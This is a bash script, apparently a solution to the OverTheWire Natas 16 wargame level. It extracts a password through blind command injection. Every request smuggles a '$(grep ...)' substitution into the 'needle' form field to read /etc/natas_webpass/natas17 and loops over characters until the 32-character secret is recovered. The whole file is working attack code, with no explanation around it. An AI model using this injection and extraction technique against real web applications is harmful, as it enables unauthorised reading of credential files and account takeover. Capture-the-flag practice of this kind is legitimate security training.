#!/bin/bash

chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
password=""

while [ ${#password} -lt 32 ]; do
	
	for ((i=0; i<${#chars}; i++)); do
		
		c="${chars:i:1}"
		if curl -s -X POST http://natas16.natas.labs.overthewire.org \
			-u "natas16:NATAS16_PASSWORD" \
			-d "needle=\$(grep ^$password$c /etc/natas_webpass/natas17)zigzag" | grep -q "zigzag"
		then
			:
		else
			password+=$c
			printf "%s\n $password"
			break
		fi
	done
done

printf "FINAL PASSWORD: $password"

